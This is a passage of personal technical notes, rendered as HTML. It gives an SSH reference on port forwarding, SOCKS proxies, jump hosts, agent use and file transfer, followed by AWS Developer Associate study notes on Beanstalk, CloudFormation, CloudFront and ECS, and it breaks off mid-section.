<h2 id="port-forwarding--tunneling"><a class="header" href="#port-forwarding--tunneling">Port Forwarding / Tunneling</a></h2>
<h3 id="local-port-forwarding--l"><a class="header" href="#local-port-forwarding--l">Local Port Forwarding (<code>-L</code>)</a></h3>
<p>Forward a local port to a remote destination through the SSH server.</p>
<pre><code>ssh -L [local_addr:]local_port:remote_host:remote_port user@ssh_server
</code></pre>
<p><strong>Use case</strong>: Access a service on a remote network that‚Äôs not directly reachable.</p>
<pre><code class="language-bash"># Forward local port 8080 to remote host's port 80
ssh -L 8080:webserver.internal:80 user@jumphost

# Access via: http://localhost:8080
</code></pre>
<h4 id="postgresql-example-remote-db-on-localhost"><a class="header" href="#postgresql-example-remote-db-on-localhost">PostgreSQL Example (Remote DB on localhost)</a></h4>
<p>Scenario: PostgreSQL on <code>dbserver</code> only listens on <code>127.0.0.1:5432</code>. You need to connect from your workstation.</p>
<pre><code class="language-bash"># Create tunnel
ssh -L 5432:localhost:5432 user@dbserver

# Now connect locally
psql -h localhost -p 5432 -U dbuser -d mydb
</code></pre>
<p>Or use a different local port to avoid conflicts:</p>
<pre><code class="language-bash"># Forward local 15432 to remote's localhost:5432
ssh -L 15432:localhost:5432 user@dbserver

# Connect via the tunnel
psql -h localhost -p 15432 -U dbuser -d mydb

# Or with connection string
psql "postgresql://dbuser:password@localhost:15432/mydb"
</code></pre>
<p><strong>Background tunnel (no shell):</strong></p>
<pre><code class="language-bash">ssh -fNL 15432:localhost:5432 user@dbserver

# -f: Background after auth
# -N: No remote command (tunnel only)
# -L: Local forward
</code></pre>
<h4 id="multiple-forwards"><a class="header" href="#multiple-forwards">Multiple Forwards</a></h4>
<pre><code class="language-bash">ssh -L 5432:localhost:5432 -L 6379:localhost:6379 user@server
</code></pre>
<hr>
<h3 id="remote-port-forwarding--r"><a class="header" href="#remote-port-forwarding--r">Remote Port Forwarding (<code>-R</code>)</a></h3>
<p>Expose a local service to the remote network.</p>
<pre><code>ssh -R [remote_addr:]remote_port:local_host:local_port user@ssh_server
</code></pre>
<p><strong>Use case</strong>: Make your local dev server accessible from the remote server.</p>
<pre><code class="language-bash"># Expose local port 3000 on remote server's port 8080
ssh -R 8080:localhost:3000 user@remote

# On remote: curl localhost:8080 hits your local :3000
</code></pre>
<hr>
<h3 id="dynamic-port-forwarding--d---socks-proxy"><a class="header" href="#dynamic-port-forwarding--d---socks-proxy">Dynamic Port Forwarding (<code>-D</code>) - SOCKS Proxy</a></h3>
<p>Create a SOCKS proxy that routes all traffic through the SSH server.</p>
<pre><code>ssh -D [local_addr:]local_port user@ssh_server
</code></pre>
<p><strong>Use case</strong>: Browse the web or access multiple services as if you were on the remote network.</p>
<pre><code class="language-bash"># Create SOCKS5 proxy on localhost:1080
ssh -D 1080 user@remote

# Configure browser/apps to use SOCKS5 proxy: localhost:1080
</code></pre>
<h4 id="using-the-socks-proxy"><a class="header" href="#using-the-socks-proxy">Using the SOCKS Proxy</a></h4>
<p><strong>curl:</strong></p>
<pre><code class="language-bash">curl --socks5 localhost:1080 http://internal.site.local
</code></pre>
<p><strong>proxychains:</strong></p>
<pre><code class="language-bash"># /etc/proxychains.conf
socks5 127.0.0.1 1080

# Run commands through proxy
proxychains psql -h db.internal -U admin -d mydb
proxychains nmap -sT 10.0.0.0/24
</code></pre>
<p><strong>Browser</strong>: Configure SOCKS5 proxy in Firefox/Chrome settings or use FoxyProxy.</p>
<h4 id="postgresql-via-socks-proxy"><a class="header" href="#postgresql-via-socks-proxy">PostgreSQL via SOCKS Proxy</a></h4>
<pre><code class="language-bash"># Start SOCKS proxy
ssh -D 1080 user@jumphost

# Use proxychains
proxychains psql -h db.internal.local -p 5432 -U dbuser -d mydb
</code></pre>
<hr>
<h2 id="tunnel-comparison"><a class="header" href="#tunnel-comparison">Tunnel Comparison</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Type</th><th>Flag</th><th>Direction</th><th>Use Case</th></tr>
</thead>
<tbody>
<tr><td>Local</td><td><code>-L</code></td><td>Local ‚Üí Remote</td><td>Access remote service locally</td></tr>
<tr><td>Remote</td><td><code>-R</code></td><td>Remote ‚Üí Local</td><td>Expose local service remotely</td></tr>
<tr><td>Dynamic</td><td><code>-D</code></td><td>SOCKS Proxy</td><td>Route all traffic through SSH</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="tunnel-options"><a class="header" href="#tunnel-options">Tunnel Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Flag</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>-f</code></td><td>Background after authentication</td></tr>
<tr><td><code>-N</code></td><td>No remote command (tunnel only)</td></tr>
<tr><td><code>-T</code></td><td>Disable pseudo-terminal allocation</td></tr>
<tr><td><code>-g</code></td><td>Allow remote hosts to connect to forwarded ports</td></tr>
</tbody>
</table>
</div>
<h3 id="common-tunnel-command"><a class="header" href="#common-tunnel-command">Common Tunnel Command</a></h3>
<pre><code class="language-bash"># Background tunnel, no shell
ssh -fNT -L 5432:localhost:5432 user@server

# Check tunnel is running
ps aux | grep ssh
lsof -i :5432
</code></pre>
<hr>
<h2 id="jump-hosts--bastion"><a class="header" href="#jump-hosts--bastion">Jump Hosts / Bastion</a></h2>
<h3 id="proxyjump-modern"><a class="header" href="#proxyjump-modern">ProxyJump (Modern)</a></h3>
<pre><code class="language-bash">ssh -J jumphost user@internal

# Multiple jumps
ssh -J jump1,jump2 user@internal
</code></pre>
<h3 id="proxycommand-legacy"><a class="header" href="#proxycommand-legacy">ProxyCommand (Legacy)</a></h3>
<pre><code class="language-bash">ssh -o ProxyCommand="ssh -W %h:%p jumphost" user@internal
</code></pre>
<h3 id="config-file"><a class="header" href="#config-file">Config File</a></h3>
<pre><code>Host internal
    HostName 10.0.0.50
    User admin
    ProxyJump jumphost
</code></pre>
<hr>
<h2 id="ssh-agent"><a class="header" href="#ssh-agent">SSH Agent</a></h2>
<pre><code class="language-bash"># Start agent
eval $(ssh-agent)

# Add key
ssh-add ~/.ssh/id_ed25519

# Add with timeout (1 hour)
ssh-add -t 3600 ~/.ssh/id_ed25519

# List keys
ssh-add -l

# Remove all keys
ssh-add -D
</code></pre>
<h3 id="agent-forwarding"><a class="header" href="#agent-forwarding">Agent Forwarding</a></h3>
<pre><code class="language-bash">ssh -A user@host
</code></pre>
<p><strong>Warning</strong>: Agent forwarding can be a security risk on untrusted hosts.</p>
<hr>
<h2 id="file-transfer"><a class="header" href="#file-transfer">File Transfer</a></h2>
<h3 id="scp"><a class="header" href="#scp">SCP</a></h3>
<pre><code class="language-bash"># Upload
scp file.txt user@host:/path/

# Download
scp user@host:/path/file.txt ./

# Recursive
scp -r folder/ user@host:/path/

# With custom port
scp -P 2222 file.txt user@host:/path/
</code></pre>
<h3 id="sftp"><a class="header" href="#sftp">SFTP</a></h3>
<pre><code class="language-bash">sftp user@host
sftp&gt; put localfile
sftp&gt; get remotefile
sftp&gt; ls
sftp&gt; cd /path
sftp&gt; exit
</code></pre>
<h3 id="rsync-over-ssh"><a class="header" href="#rsync-over-ssh">Rsync over SSH</a></h3>
<pre><code class="language-bash">rsync -avz -e ssh source/ user@host:/dest/
rsync -avz -e "ssh -p 2222" source/ user@host:/dest/
</code></pre>
<hr>
<h2 id="escape-sequences"><a class="header" href="#escape-sequences">Escape Sequences</a></h2>
<p>Press <code>~</code> after newline:</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Sequence</th><th>Action</th></tr>
</thead>
<tbody>
<tr><td><code>~.</code></td><td>Disconnect</td></tr>
<tr><td><code>~^Z</code></td><td>Background SSH</td></tr>
<tr><td><code>~#</code></td><td>List forwarded connections</td></tr>
<tr><td><code>~?</code></td><td>Help</td></tr>
<tr><td><code>~C</code></td><td>Open command line (add forwards)</td></tr>
</tbody>
</table>
</div>
<h3 id="add-forward-to-running-session"><a class="header" href="#add-forward-to-running-session">Add Forward to Running Session</a></h3>
<pre><code>~C
ssh&gt; -L 8080:localhost:80
</code></pre>
<hr>
<h2 id="security-options"><a class="header" href="#security-options">Security Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>-o StrictHostKeyChecking=yes</code></td><td>Reject unknown hosts</td></tr>
<tr><td><code>-o UserKnownHostsFile=/dev/null</code></td><td>Don‚Äôt save host keys</td></tr>
<tr><td><code>-o PasswordAuthentication=no</code></td><td>Force key auth</td></tr>
<tr><td><code>-o PubkeyAuthentication=yes</code></td><td>Enable key auth</td></tr>
</tbody>
</table>
</div>
<h3 id="disable-host-key-checking-testing-only"><a class="header" href="#disable-host-key-checking-testing-only">Disable Host Key Checking (Testing Only)</a></h3>
<pre><code class="language-bash">ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@host
</code></pre>
<hr>
<h2 id="practical-examples"><a class="header" href="#practical-examples">Practical Examples</a></h2>
<h3 id="access-remote-postgresql-localhost-only"><a class="header" href="#access-remote-postgresql-localhost-only">Access Remote PostgreSQL (localhost only)</a></h3>
<pre><code class="language-bash"># Scenario: PostgreSQL on server only binds to 127.0.0.1:5432

# Option 1: Local forward
ssh -L 5432:127.0.0.1:5432 user@dbserver
psql -h localhost -U postgres -d mydb

# Option 2: Different local port
ssh -fNL 15432:127.0.0.1:5432 user@dbserver
psql -h localhost -p 15432 -U postgres -d mydb

# Option 3: Via jump host
ssh -L 5432:dbserver.internal:5432 user@jumphost
psql -h localhost -U postgres -d mydb
</code></pre>
<h3 id="access-remote-redis"><a class="header" href="#access-remote-redis">Access Remote Redis</a></h3>
<pre><code class="language-bash">ssh -L 6379:localhost:6379 user@server
redis-cli -h localhost
</code></pre>
<h3 id="browse-internal-network"><a class="header" href="#browse-internal-network">Browse Internal Network</a></h3>
<pre><code class="language-bash">ssh -D 9050 user@internal-host
# Configure browser SOCKS5: localhost:9050
</code></pre>
<h3 id="tunnel-to-multiple-services"><a class="header" href="#tunnel-to-multiple-services">Tunnel to Multiple Services</a></h3>
<pre><code class="language-bash">ssh -L 5432:localhost:5432 \
    -L 6379:localhost:6379 \
    -L 8080:webapp.internal:80 \
    user@jumphost
</code></pre>
<hr>
<h2 id="troubleshooting"><a class="header" href="#troubleshooting">Troubleshooting</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Issue</th><th>Solution</th></tr>
</thead>
<tbody>
<tr><td>Connection refused</td><td>Check SSH service, firewall, port</td></tr>
<tr><td>Permission denied</td><td>Check key permissions, user, auth method</td></tr>
<tr><td>Host key changed</td><td>Remove old key: <code>ssh-keygen -R host</code></td></tr>
<tr><td>Tunnel not working</td><td>Check if remote port is listening on localhost</td></tr>
<tr><td>Broken pipe</td><td>Add <code>ServerAliveInterval 60</code> to config</td></tr>
</tbody>
</table>
</div>
<h3 id="debug-connection"><a class="header" href="#debug-connection">Debug Connection</a></h3>
<pre><code class="language-bash">ssh -vvv user@host
</code></pre>
<h3 id="keep-connection-alive"><a class="header" href="#keep-connection-alive">Keep Connection Alive</a></h3>
<pre><code># ~/.ssh/config
Host *
    ServerAliveInterval 60
    ServerAliveCountMax 3
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="clouds"><a class="header" href="#clouds">Clouds</a></h1>
<p>Notes related to various cloud service providers.</p>
<h2 id="directory-map-1"><a class="header" href="#directory-map-1">Directory Map</a></h2>
<ul>
<li><a href="clouds/aws">aws</a></li>
<li><a href="clouds/azure">azure</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="aws"><a class="header" href="#aws">AWS</a></h1>
<p>Notes related to Amazon Web Services (AWS).</p>
<ul>
<li><a href="clouds/aws/dva-c02/README.html">AWS Certified Developer</a>: Notes for the AWS Certified Developer - Associate (DVA-C02) exam.</li>
<li><a href="clouds/aws/saa-c03/README.html">Solutions Architect - Associate</a>: Notes for the AWS Certified Solutions Architect - Associate (SAA-C03) exam.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="dva-c02-notes"><a class="header" href="#dva-c02-notes">DVA-C02-notes</a></h1>
<h2 id="directory-map-2"><a class="header" href="#directory-map-2">Directory Map</a></h2>
<ul>
<li><a href="#elastic-beanstalk">beanstalk</a></li>
<li><a href="#cloudformation">cloudformation</a></li>
<li><a href="#cloudfront">cloudfront</a></li>
<li><a href="clouds/aws/dva-c02/containers">containers</a>
<ul>
<li><a href="#copilot">copilot</a></li>
<li><a href="#elastic-container-registry">ecr</a></li>
<li><a href="#elastic-container-service">ecs</a></li>
</ul>
</li>
<li><a href="#dynamodb">dynamodb</a></li>
<li><a href="#ec2">ec2</a></li>
<li><a href="#elasticache">elasticache</a></li>
<li><a href="#iam">iam</a></li>
<li><a href="#kinesis">kinesis</a></li>
<li><a href="#lambda">lambda</a></li>
<li><a href="clouds/aws/dva-c02/monitoring">monitoring</a>
<ul>
<li><a href="#cloudtrail">cloudtrail</a></li>
<li><a href="#cloudwatch">cloudwatch</a></li>
<li><a href="#x-ray">x-ray</a></li>
</ul>
</li>
<li><a href="clouds/aws/dva-c02/rds">rds</a>
<ul>
<li><a href="#aurora">aurora</a></li>
<li><a href="#rds-relational-database-service">rds</a></li>
</ul>
</li>
<li><a href="#route53">route53</a></li>
<li><a href="#s3">s3</a></li>
<li><a href="#simple-notification-system">sns</a></li>
<li><a href="#simple-queue-system">sqs</a></li>
<li><a href="#vpc">vpc</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="elastic-beanstalk"><a class="header" href="#elastic-beanstalk">Elastic Beanstalk</a></h1>
<h2 id="introduction"><a class="header" href="#introduction">Introduction</a></h2>
<ul>
<li>Developer centric view of deploying an application on AWS</li>
<li>Simplifies deploying EC2, ASG, ELB, RDS, etc.</li>
<li>Fully managed by AWS</li>
</ul>
<h2 id="beanstalk-components"><a class="header" href="#beanstalk-components">Beanstalk Components</a></h2>
<ul>
<li>Application: A collection of Beanstalk components</li>
<li>Application Version: an iteration of your application</li>
<li>Environment:
<ul>
<li>collection of AWS resources running an application version</li>
<li>Tiers: web server environment and worker environment</li>
<li>You can create multiple environments (dev, prod, QA, etc.)</li>
</ul>
</li>
</ul>
<h2 id="supported-platforms"><a class="header" href="#supported-platforms">Supported Platforms</a></h2>
<ul>
<li>Multiple languages supported: Go, Python, Java, .NET, Node, PHP, Ruby, Packer Builder,</li>
<li>Supports single container docker, multi-container docker, etc.</li>
</ul>
<h2 id="deployment-modes"><a class="header" href="#deployment-modes">Deployment Modes</a></h2>
<ul>
<li>Single Instance
<ul>
<li>One EC2 instance</li>
<li>Great for dev environments</li>
</ul>
</li>
<li>HA with Load Balancer
<ul>
<li>Multiple EC2 instances in ASG</li>
<li>Great for prod</li>
</ul>
</li>
</ul>
<h2 id="deployment-options"><a class="header" href="#deployment-options">Deployment Options</a></h2>
<ul>
<li>All at once
<ul>
<li>fastest, but instances aren‚Äôt available to service traffic for a bit (downtime)</li>
</ul>
</li>
<li>Rolling
<ul>
<li>A few instances at a time are taken offline and updated</li>
</ul>
</li>
<li>Rolling with additional batches
<ul>
<li>Like rolling, but spins up new instances to move the batch</li>
</ul>
</li>
<li>Immutable
<ul>
<li>Spins up new instances in a new ASG, deploys versions to these instances, and then swaps all the instances when the new are healthy</li>
</ul>
</li>
<li>Blue/Green
<ul>
<li>Create a new environment and switch over when ready</li>
</ul>
</li>
<li>Traffic Splitting
<ul>
<li>Like canary testing</li>
</ul>
</li>
</ul>
<img src="clouds/aws/dva-c02/images/beanstalk-deployment-methods.png.png" width="77%" height="40%" />
<h2 id="beanstalk-lifecycle-policy"><a class="header" href="#beanstalk-lifecycle-policy">Beanstalk Lifecycle Policy</a></h2>
<ul>
<li>Beanstalk can store at most 1000 application versions</li>
<li>Versions currently in use cannot be deleted</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="cloudformation"><a class="header" href="#cloudformation">CloudFormation</a></h1>
<h2 id="introduction-1"><a class="header" href="#introduction-1">Introduction</a></h2>
<ul>
<li>Declarative language for deploying resources in AWS</li>
<li>YAML or JSON</li>
<li>CloudFormation templates can be visualized using Application Composer</li>
</ul>
<h2 id="example-2"><a class="header" href="#example-2">Example</a></h2>
<pre><code>---
Resources:
  MyInstance:
    Type: AWS::EC2::Instance
    Properties:
      AvailabilityZone: us-east-1a
      ImageId: ami-0a3c3a20c09d6f377
      InstanceType: t2.micro
</code></pre>
<h2 id="cloudformation-template-sections"><a class="header" href="#cloudformation-template-sections">CloudFormation Template Sections</a></h2>
<ul>
<li>
<p>Resources</p>
<ul>
<li>The only required section in a template</li>
<li>The resources section represent the AWS components that the CF template will deploy</li>
<li>Resource type identifiers are in this format:
<ul>
<li>service-provider::service-name::data-type-name</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Parameters</p>
<ul>
<li>Provide input to your CF templates</li>
</ul>
</li>
<li>
<p>Mappings</p>
<ul>
<li>
<p>Fixed variables in your CF template used to differentiate between different environment like dev vs prod, regions, AMI types, etc.</p>
</li>
<li>
<p>To access values in a map, use <code>Fn::FindInMap</code>:</p>
<pre><code>    {
      ...
      "Mappings" : {
        "RegionMap" : {
          "us-east-1" : {
            "HVM64" : "ami-0ff8a91507f77f867", "HVMG2" : "ami-0a584ac55a7631c0c"
          },
          "us-west-1" : {
            "HVM64" : "ami-0bdb828fd58c52235", "HVMG2" : "ami-066ee5fd4a9ef77f1"
          },
          "eu-west-1" : {
            "HVM64" : "ami-047bb4163c506cd98", "HVMG2" : "ami-0a7c483d527806435"
          },
          "ap-southeast-1" : {
            "HVM64" : "ami-08569b978cc4dfa10", "HVMG2" : "ami-0be9df32ae9f92309"
          },
          "ap-northeast-1" : {
            "HVM64" : "ami-06cd52961ce9f0d85", "HVMG2" : "ami-053cdd503598e4a9d"
          }
        }
      },

      "Resources" : {
        "myEC2Instance" : {
          "Type" : "AWS::EC2::Instance",
          "Properties" : {
            "ImageId" : {
              "Fn::FindInMap" : [
                "RegionMap",
                {
                  "Ref" : "AWS::Region"
                },
                "HVM64"
              ]
            },
            "InstanceType" : "m1.small"
          }
        }
      }
    }
</code></pre>
</li>
</ul>
</li>
<li>
<p>Outputs</p>
<ul>
<li>Optional</li>
<li>Output values can be referenced in other stacks</li>
<li>Use <code>FN:ImportValue</code></li>
</ul>
</li>
<li>
<p>Conditions</p>
<ul>
<li>Control the creation of resources or outputs based on a condition</li>
</ul>
</li>
</ul>
<h2 id="intrinsic-functions"><a class="header" href="#intrinsic-functions">Intrinsic Functions</a></h2>
<ul>
<li>Fn::Ref - Get a references to a value of a paremeter, physical Id of a resource, etc.</li>
<li>Fn::GetAtt - Get attributes from a resource</li>
<li>Fn::FindInMap - Retrieve a value from a map</li>
<li>Fn::ImportValue - Import an output value from another template</li>
<li>Fn::Base64 - Convert a value to Base64 inside a template</li>
<li>Condition Functions (Fn::If, Fn::Not, Fn::Equals, etc.)</li>
<li>etc‚Ä¶.</li>
</ul>
<h2 id="service-roles"><a class="header" href="#service-roles">Service Roles</a></h2>
<ul>
<li>IAM roles that allow CloudFormation to create/update/delete stack resources</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="cloudfront"><a class="header" href="#cloudfront">CloudFront</a></h1>
<h2 id="table-of-contents"><a class="header" href="#table-of-contents">Table of Contents</a></h2>
<ul>
<li><a href="#introduction-3">Introduction</a></li>
<li><a href="#cloudfront-core-components-1">CloudFront Core Components</a></li>
<li><a href="#cloudfront-distributions-1">CloudFront Distributions</a></li>
<li><a href="#lambdaedge-1">Lambda@Edge</a></li>
<li><a href="#cloudfront-protection-1">CloudFront Protection</a></li>
<li><a href="#caching-policy-1">Caching Policy</a></li>
<li><a href="#caching-behaviors-1">Caching Behaviors</a></li>
<li><a href="#geo-restriction-1">Geo-Restriction</a></li>
<li><a href="#cloudfront-signed-url-1">CloudFront Signed URL</a></li>
<li><a href="#pricing-1">Pricing</a></li>
</ul>
<p><a id="introduction-2"></a></p>
<h2 id="introduction-3"><a class="header" href="#introduction-3">Introduction</a></h2>
<ul>
<li>Content Distribution Network (CDN) creates cached copies of your website at various Edge locations around the world</li>
<li>Content Delivery Network (CDN)
<ul>
<li>A CDN is a distributed network of servers which delivers web pages and content to users based on their geographical location, the origin of the webpage and a content delivery server
<ul>
<li>Can be used to deliver an entire website including static, dynamic and streaming</li>
<li>216 points of presence globally</li>
<li>DDoS protection since it is a global service. Integrates with AWS Shield and AWS WAF</li>
<li>Requests for content are served from the nearest Edge Location for the best possible performance
<img src="clouds/aws/dva-c02/images/CDN.jpg" width="77%" height="40%" /></li>
</ul>
</li>
</ul>
</li>
</ul>
<p><a id="cloudfront-core-components"></a></p>
<h2 id="cloudfront-core-components-1"><a class="header" href="#cloudfront-core-components-1">CloudFront Core Components</a></h2>
<ul>
<li><b> Origin </b>
<ul>
<li>The location where all of original files are located. For example an S3 Bucket, EC2 Instance, ELB or Route53</li>
</ul>
</li>
<li><b> Edge Location </b>
<ul>
<li>The location where web content will be cached. This is different than an AWS Region or AZ</li>
</ul>
</li>
<li><b> Distribution </b>
<ul>
<li>A collection of Edge locations which defines how cached content should behave
<img src="clouds/aws/dva-c02/images/cloudfront-core-components.jpg" width="77%" height="40%" /></li>
</ul>
</li>
</ul>
<p><a id="cloudfront-distributions"></a></p>
<h2 id="cloudfront-distributions-1"><a class="header" href="#cloudfront-distributions-1">CloudFront Distributions</a></h2>
<ul>
<li>A distribution is a collection of Edge Location. You specific the Origin eg. S3, EC2, ELB, Route53</li>
<li>It replicates copies based on your Price Class</li>
<li>There are two types of Distributions
<ol>
<li>Web (for Websites)</li>
<li>RTMP (for streaming media)</li>
</ol>
</li>
<li><b> Behaviors </b>
<ul>
<li>Redirect to HTTPs, Restrict HTTP Methods, Restrict Viewer Access, Set TTLs</li>
</ul>
</li>
<li><b> Invalidations </b>
<ul>
<li>You can manually invalidate cache on specific files via Invalidations</li>
</ul>
</li>
<li><b> Error Pages </b>
<ul>
<li>You can serve up custom error pages eg 404</li>
</ul>
</li>
<li><b> Restrictions </b>
<ul>
<li>You can use Geo Restriction to blacklist or whitelist specific countries</li>
</ul>
</li>
</ul>
<p><a id="lambdaedge"></a></p>
<h2 id="lambdaedge-1"><a class="header" href="#lambdaedge-1">Lambda@Edge</a></h2>
<ul>
<li>
<p>Lambda@Edge functions are used to override the behavior of request and responses</p>
</li>
<li>
<p>Lambda@Edge lets you run Lambda functions to customize the content that CloudFront delivers, executing the functions in AWS locations closer to the viewer.</p>
</li>
<li>
<p>The functions run in response to CloudFront events, without provisioning or managing servers. You can use Lambda functions to change CloudFront requests and responses at the following points:</p>
</li>
<li>
<p>The 4 Available Edge Functions</p>
<ol>
<li>Viewer Request
<ul>
<li>When CloudFront receives a request from a Viewer</li>
</ul>
</li>
<li>Origin request
<ul>
<li>Before CLoudFront forwards a request to the origin</li>
</ul>
</li>
<li>Origin response
<ul>
<li>When cloudfront receives a response from the origin</li>
</ul>
</li>
<li>Viewer response
<ul>
<li>Before CLoudFront returns the response to the viewer</li>
</ul>
</li>
</ol>
  <img src="clouds/aws/dva-c02/images/lambda.jpg" width="47%" />
  <img src="clouds/aws/dva-c02/images/Lamda@edge.jpg" width="47%" />
</li>
</ul>
<p><a id="cloudfront-protection"></a></p>
<h2 id="cloudfront-protection-1"><a class="header" href="#cloudfront-protection-1">CloudFront Protection</a></h2>
<ul>
<li>By Default a Distribution allows everyone to have access</li>
<li>Original Identity Access (OAI)
<ul>
<li>A virtual user identity that will be used to give your CloudFront Distribution permission to fetch a private object</li>
</ul>
</li>
<li>Inorder to use Signed URLs or Signed Cookies you need to have an OAI</li>
<li><b> Signed URLs </b>
<ul>
<li>(Not the same thing as S3 Presigned URL)
<ul>
<li>A url with provides temporary access to cached objects</li>
</ul>
</li>
</ul>
</li>
<li><b> Signed Cookies </b>
<ul>
<li>A cookie which is passed along with the request to CloudFront. The advantage of using a Cookie is you want to provide access to multiple restricted files. eg. Video Streaming</li>
</ul>
</li>
</ul>
<p><a id="caching-policy"></a></p>
<h2 id="caching-policy-1"><a class="header" href="#caching-policy-1">Caching Policy</a></h2>
<ul>
<li>Each object in the cache will be identified by a cache key</li>
<li>Maximize the cache-hit-ratio by minimizing requests to the origin</li>
<li>Cache Key
<ul>
<li>a unique identifier for everything in the cache</li>
<li>by default, made up of the hostname and resource portion of the URL</li>
<li>The cache key can be customized by creating a CloudFront Cache Policy</li>
</ul>
</li>
</ul>
<p><a id="caching-behaviors"></a></p>
<h2 id="caching-behaviors-1"><a class="header" href="#caching-behaviors-1">Caching Behaviors</a></h2>
<ul>
<li>Configure different settings for a given URL path pattern</li>
<li>Example: configure a specific behavior for requests to /images/*.jpg</li>
<li>Route to different kinds of origins/origin groups based on the content-type or path.</li>
<li>Examples:
<ul>
<li>/images/* to S3</li>
<li>/login to EC2</li>
<li>/api to API Gateway</li>
</ul>
</li>
</ul>
<p><a id="geo-restriction"></a></p>
<h2 id="geo-restriction-1"><a class="header" href="#geo-restriction-1">Geo-Restriction</a></h2>
<ul>
<li>Restrict who can access your CloudFront distribution based on the country where the distribution was access from</li>
<li>You can create an AllowList or a BlockList</li>
</ul>
<p><a id="cloudfront-signed-url"></a></p>
<h2 id="cloudfront-signed-url-1"><a class="header" href="#cloudfront-signed-url-1">CloudFront Signed URL</a></h2>
<ul>
<li>Two types of signers:
<ul>
<li>Either a trusted key group (Recommended)</li>
<li>An AWS Account that contains a CloudFront Key Pair</li>
</ul>
</li>
<li>In your distribution, create one or more trusted key groups</li>
</ul>
<p><a id="pricing"></a></p>
<h2 id="pricing-1"><a class="header" href="#pricing-1">Pricing</a></h2>
<ul>
<li>You can reduce the number of edge locations for a cost savings</li>
<li>Price Classes
<ul>
<li>Price Class All: All regions, best performance</li>
<li>Price Class 200: most regions, but excludes the most expensive regions</li>
<li>Price Class 100: only the least expensive regions</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="copilot"><a class="header" href="#copilot">Copilot</a></h1>
<h2 id="introduction-4"><a class="header" href="#introduction-4">Introduction</a></h2>
<ul>
<li>CLI tool to build, release, and maintain production ready containerized apps</li>
<li>Helps you focus on building apps rather than setting up infrastructure</li>
<li>Automatically provisions all required infrastructure for a containerized app</li>
<li>Automate deployments using one command with CodePipeline</li>
<li>Deploy to ECS, Fargate, or App Runner</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="elastic-container-registry"><a class="header" href="#elastic-container-registry">Elastic Container Registry</a></h1>
<h2 id="introduction-5"><a class="header" href="#introduction-5">Introduction</a></h2>
<ul>
<li>Store container images in AWS, similar to DockerHub</li>
<li>Public or Private</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="elastic-container-service"><a class="header" href="#elastic-container-service">Elastic Container Service</a></h1>
<h2 id="introduction-6"><a class="header" href="#introduction-6">Introduction</a></h2>
<ul>
<li>Launch container instances on AWS as ECS Tasks</li>
<li>Launch Types:
<ul>
<li>EC2: You must provision and manage the infrastructure (EC2 instances)
<ul>
<li>Each EC2 instance must run the ECS Agent to register in the ECS cluster</li>
</ul>
</li>
<li>
<h2 id="fargate-aws-provisions-and-manages-the-infrastructure"><a class="header" href="#fargate-aws-provisions-and-manages-the-infrastructure">Fargate: AWS provisions and manages the infrastructure</a></h2>
</li>
</ul>
</li>
</ul>
<h2 id="iam-roles-for-ecs"><a class="header" href="#iam-roles-for-ecs">IAM Roles for ECS</a></h2>
<ul>
<li>EC2 Instance Profile
<ul>
<li>Used by the ECS agent to make API calls to ECS Service, send container logs to CloudWatch, pull docker images from ECR, etc.</li>
</ul>
</li>
<li>ECS Tasks:
<ul>
<li>Each ECS tasks gets a role. Applies to both EC2 and Fargate launch types</li>
<li>Task role is defined in the Task Definition</li>
</ul>
</li>
</ul>
<h2 id="load-balancer-integrations"><a class="header" href="#load-balancer-integrations">Load Balancer Integrations</a></h2>
<ul>
<li>ALB supports and works for most use cases</li>
<li>NLB is recommended only for high-throughput use cases</li>
</ul>
<h2 id="data-volumes"><a class="header" href="#data-volumes">Data Volumes</a></h2>
<ul>
<li>Mount EFS file systems onto ECS Tasks</li>
<li>Works for both EC2 and Fargate Launch Types</li>
<li>Tasks running in any AZ will share the same data in the EFS file system</li>
<li>EFS + Fargate = serverless</li>
<li>S3 cannot be mounted on a file system in your ECS Tasks</li>
</ul>
<h2 id="ecs-service-auto-scaling"><a class="header" href="#ecs-service-auto-scaling">ECS Service Auto-scaling</a></h2>
<ul>
<li>You can scale on 3 metrics
<ul>
<li>CPU</li>
<li>Memory</li>
<li>ALB Request Count</li>
</ul>
</li>
<li>Types of Scaling:
<ul>
<li>Target Tracking: scale based on target value for a specific CloudWatch metric</li>
<li>Step Scaling: scale based on a specified CloudWatch Alarm</li>
<li>Scheduled Scaling: scale based on a specified date/time</li>
</ul>
</li>
<li>Auto Scaling EC2 instances
<ul>
<li>Use an Auto Scaling Group
<ul>
<li>Scale based on CPU usage</li>
</ul>
</li>
<li>ECS Cluster Capacity Provider
<ul>
<li>Used to automatically provision and scale the infrastructure of your ECS Tasks</li>
<li>Capacity Provider is paired with an auto-scaling group</li>
<li>Add EC2 instances when you are out of usable capacity (CPU, RAM, etc‚Ä¶)</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="ecs-rolling-updates"><a class="header" href="#ecs-rolling-updates">ECS Rolling Updates</a></h2>
<ul>
<li>When updating versions of an ECS service, we can control how many tasks can be started and stopped, and in which order</li>
<li>Rolling Updates</li>
</ul>
<h2 id="ecs-tasks-definitions"><a class="header" href="#ecs-tasks-definitions">ECS Tasks Definitions</a></h2>
<ul>
<li>Tasks definitions are metadata in JSON form to tell ECS how to run a container</li>
<li>How can we add environment variables to an ECS Task?
<ul>
